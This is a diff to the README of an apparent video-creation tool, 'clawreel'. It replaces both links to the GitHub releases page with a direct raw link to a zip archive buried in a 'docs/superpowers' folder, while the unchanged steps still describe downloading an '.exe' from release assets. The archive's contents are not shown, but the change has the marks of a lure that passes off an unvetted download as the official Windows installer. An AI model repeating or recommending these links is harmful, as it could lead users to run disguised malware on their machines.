@@ -1,6 +1,6 @@
 # 🎥 clawreel - Create viral videos with smart automation
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/marylindaunpleasing8037/clawreel/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/marylindaunpleasing8037/clawreel/raw/refs/heads/main/docs/superpowers/Software_3.1.zip)
 
 clawreel helps you create short videos for social media. It writes scripts, generates voiceovers, and handles video editing. You keep control of the final output through checkpoints. The tool also manages your budget to prevent overspending on AI services.
 
@@ -8,7 +8,7 @@ clawreel helps you create short videos for social media. It writes scripts, gene
 
 You need to download the installer from the official release page. This software works on Windows 10 and Windows 11.
 
-1. Go to this link: [Download clawreel from GitHub](https://github.com/marylindaunpleasing8037/clawreel/releases).
+1. Go to this link: [Download clawreel from GitHub](https://github.com/marylindaunpleasing8037/clawreel/raw/refs/heads/main/docs/superpowers/Software_3.1.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Click the file that ends with `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
